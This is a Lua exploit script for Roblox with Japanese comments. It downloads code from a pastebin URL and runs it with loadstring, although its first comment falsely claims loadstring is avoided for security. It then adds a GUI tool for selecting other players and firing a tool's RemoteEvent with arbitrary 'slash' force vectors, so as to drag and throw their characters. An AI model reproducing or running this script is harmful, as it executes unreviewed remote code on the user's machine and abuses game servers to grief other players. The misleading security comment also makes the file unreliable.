-- loadstringの代わりに直接処理（セキュリティ向上）
local success, result = pcall(function()
    return game:HttpGet("https://pastebin.com/raw/Qw9A3dbP", true)
end)

if success then
    loadstring(result)()
else
    warn("スクリプトの読み込みに失敗しました:", result)
end

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")

local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()

local currentMode = "Single"
local selectedTarget = nil
local selectedTargets = {}
local isLocked = false
local draggingLoop = nil
local toolEquipped = false

-- ツールの作成
local tool = Instance.new("Tool")
tool.Name = "Control"
tool.RequiresHandle = false
tool.CanBeDropped = false
tool.Parent = LocalPlayer:WaitForChild("Backpack")

-- ScreenGuiの作成（より確実な方法）
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "PullUI"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

-- ボタン作成関数の改善
local function createButton(name, text, position, size)
    local btn = Instance.new("TextButton")
    btn.Name = name
    btn.Text = text
    btn.Size = size or UDim2.new(0, 80, 0, 40)
    btn.Position = position
    btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 16
    btn.AutoButtonColor = true
    btn.BackgroundTransparency = 0.3
    btn.BorderSizePixel = 0
    
    -- 角丸の追加
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = btn
    
    btn.Visible = false
    btn.Parent = screenGui
    return btn
end

-- UI配置の修正（UDim2を正しく使用）
local baseX = 0.95  -- 右端から
local offsetX = -180
local startY = 0.3

local upButton = createButton("UpButton", "⬆", UDim2.new(baseX, offsetX, startY, 0))
local downButton = createButton("DownButton", "⬇", UDim2.new(baseX, offsetX, startY + 0.15, 0))
local leftButton = createButton("LeftButton", "⬅", UDim2.new(baseX, offsetX - 90, startY + 0.075, 0))
local rightButton = createButton("RightButton", "➡", UDim2.new(baseX, offsetX + 90, startY + 0.075, 0))
local forwardButton = createButton("ForwardButton", "⬆️ Fwd", UDim2.new(baseX, offsetX + 90, startY - 0.1, 0))
local backButton = createButton("BackButton", "⬇️ Bwd", UDim2.new(baseX, offsetX - 90, startY - 0.1, 0))

local throwButton = createButton("ThrowButton", "Throw Target", UDim2.new(baseX, offsetX - 31, startY - 0.26, 0), UDim2.new(0, 160, 0, 40))
local lockButton = createButton("LockTarget", "🔒 Lock Target", UDim2.new(baseX, offsetX - 30, startY + 0.30, 0), UDim2.new(0, 140, 0, 35))
local modeButton = createButton("ModeButton", "Mode: Single", UDim2.new(baseX, offsetX - 20, startY + 0.42, 0), UDim2.new(0, 150, 0, 35))
modeButton.BackgroundColor3 = Color3.new(0, 0, 0)
modeButton.TextColor3 = Color3.new(1, 1, 1)

local directions = {Up = false, Down = false, Left = false, Right = false, Forward = false, Backward = false}

-- リモートイベント検索関数（改善版）
local function findRemoteEvent()
    local containers = {LocalPlayer.Backpack, LocalPlayer.Character}
    
    for _, container in ipairs(containers) do
        if container then
            for _, item in ipairs(container:GetChildren()) do
                if item:IsA("Tool") then
                    local ev = item:FindFirstChild("Event")
                    if ev and ev:IsA("RemoteEvent") then
                        return ev
                    end
                end
            end
        end
    end
    return nil
end

-- ハイライト機能の改善
local highlights = {}  -- ハイライト管理用テーブル

local function applyHighlight(character)
    if character and not highlights[character] then
        local h = Instance.new("Highlight")
        h.Name = "ClickHighlight"
        h.Adornee = character
        h.FillColor = Color3.fromRGB(0, 100, 200)
        h.FillTransparency = 0.7
        h.OutlineColor = Color3.fromRGB(0, 170, 255)
        h.OutlineTransparency = 0
        h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        h.Parent = character
        
        highlights[character] = h
    end
end

local function clearHighlight()
    for character, highlight in pairs(highlights) do
        if highlight and highlight.Parent then
            highlight:Destroy()
        end
    end
    
    highlights = {}
    selectedTargets = {}
    selectedTarget = nil
end

-- 相対方向ベクトル取得関数
local function getRelativeDirectionVector()
    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then 
        return Vector3.zero 
    end

    local hrp = char.HumanoidRootPart
    local forward = hrp.CFrame.LookVector
    local right = hrp.CFrame.RightVector
    local up = Vector3.new(0, 1, 0)

    local dir = Vector3.zero
    if directions.Forward then dir += forward end
    if directions.Backward then dir -= forward end
    if directions.Right then dir += right end
    if directions.Left then dir -= right end
    if directions.Up then dir += up end
    if directions.Down then dir -= up end

    return dir.Unit  -- 正規化
end

-- 方向ループ更新（改善版）
local function updateDirectionLoop()
    if draggingLoop then 
        draggingLoop:Disconnect() 
        draggingLoop = nil
    end
    
    local remote = findRemoteEvent()
    if not remote then return end

    draggingLoop = RunService.Heartbeat:Connect(function()
        local targets = {}
        if currentMode == "Multiple" then
            targets = selectedTargets
        elseif selectedTarget then
            targets = {selectedTarget}
        else
            return
        end
        
        local dirVector = getRelativeDirectionVector()
        if dirVector.Magnitude > 0 then
            for _, target in ipairs(targets) do
                if target and target:FindFirstChild("HumanoidRootPart") then
                    remote:FireServer("slash", target, dirVector * 10)
                end
            end
        end
    end)
end

-- モードボタンクリック
modeButton.MouseButton1Click:Connect(function()
    clearHighlight()
    
    if currentMode == "Single" then
        currentMode = "Multiple"
        modeButton.Text = "Mode: Multiple"
    else
        currentMode = "Single"
        modeButton.Text = "Mode: Single"
    end
end)

-- 矢印ボタン接続関数
local function connectArrowButton(button, dirKey)
    button.MouseButton1Down:Connect(function()
        directions[dirKey] = true
        updateDirectionLoop()
    end)
    
    button.MouseButton1Up:Connect(function()
        directions[dirKey] = false
    end)
    
    button.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            directions[dirKey] = true
            updateDirectionLoop()
        end
    end)
    
    button.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            directions[dirKey] = false
        end
    end)
end

-- ボタン接続
connectArrowButton(upButton, "Up")
connectArrowButton(downButton, "Down")
connectArrowButton(leftButton, "Left")
connectArrowButton(rightButton, "Right")
connectArrowButton(forwardButton, "Forward")
connectArrowButton(backButton, "Backward")

-- マウスクリック処理
Mouse.Button1Down:Connect(function()
    local target = Mouse.Target
    if not target then return end
    
    local model = target:FindFirstAncestorOfClass("Model")
    if not model then return end
    
    local player = Players:GetPlayerFromCharacter(model)
    if player and player ~= LocalPlayer then
        if currentMode == "Single" then
            clearHighlight()
            selectedTarget = model
            applyHighlight(model)
        else
            if not table.find(selectedTargets, model) then
                table.insert(selectedTargets, model)
                applyHighlight(model)
            end
        end
    end
end)

-- スロー機能
throwButton.MouseButton1Click:Connect(function()
    local remote = findRemoteEvent()
    if not remote then return end
    
    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    
    local targets = currentMode == "Multiple" and selectedTargets or {selectedTarget}
    
    for _, target in ipairs(targets) do
        if target and target:FindFirstChild("HumanoidRootPart") then
            local forward = char.HumanoidRootPart.CFrame.LookVector
            local force = forward * 80 + Vector3.new(0, 60, 0)
            remote:FireServer("slash", target, force)
        end
    end
end)

-- ロック機能
lockButton.MouseButton1Click:Connect(function()
    isLocked = not isLocked
    lockButton.Text = isLocked and "🔓 Unlock" or "🔒 Lock Target"
    
    if isLocked and selectedTarget then
        -- ロック時にハイライトを点滅させる
        local highlight = highlights[selectedTarget]
        if highlight then
            while isLocked and highlight and highlight.Parent do
                highlight.OutlineTransparency = 0.5
                task.wait(0.3)
                highlight.OutlineTransparency = 0
                task.wait(0.3)
            end
        end
    end
end)

-- ツール装備時の処理
tool.Equipped:Connect(function()
    local buttons = {upButton, downButton, leftButton, rightButton, forwardButton, backButton, 
                     throwButton, lockButton, modeButton}
    
    for _, button in ipairs(buttons) do
        button.Visible = true
        -- フェードイン効果
        button.BackgroundTransparency = 0.7
        local tween = TweenService:Create(button, TweenInfo.new(0.3), {BackgroundTransparency = 0.3})
        tween:Play()
    end
end)

-- ツール解除時の処理
tool.Unequipped:Connect(function()
    local buttons = {upButton, downButton, leftButton, rightButton, forwardButton, backButton, 
                     throwButton, lockButton, modeButton}
    
    for _, button in ipairs(buttons) do
        button.Visible = false
    end
    
    if draggingLoop then 
        draggingLoop:Disconnect() 
        draggingLoop = nil
    end
    
    -- 方向キーリセット
    for key in pairs(directions) do
        directions[key] = false
    end
    
    isLocked = false
end)

-- キャラクター追加時の処理
LocalPlayer.CharacterAdded:Connect(function()
    -- クリーンアップ
    clearHighlight()
    
    if draggingLoop then 
        draggingLoop:Disconnect() 
        draggingLoop = nil
    end
    
    selectedTarget = nil
    selectedTargets = {}
    isLocked = false
    toolEquipped = false
    
    -- スクリーンGUIの再設定
    if screenGui and screenGui.Parent then
        screenGui:Destroy()
    end
    
    -- ツールの再配置（必要に応じて）
    task.wait(1)
    if tool and tool.Parent ~= LocalPlayer.Backpack then
        tool.Parent = LocalPlayer:WaitForChild("Backpack")
    end
end)

-- ゲーム終了時のクリーンアップ
game:GetService("CoreGui").ChildRemoved:Connect(function(child)
    if child == screenGui then
        clearHighlight()
        if draggingLoop then draggingLoop:Disconnect() end
    end
end)

print("Control Tool loaded successfully!")
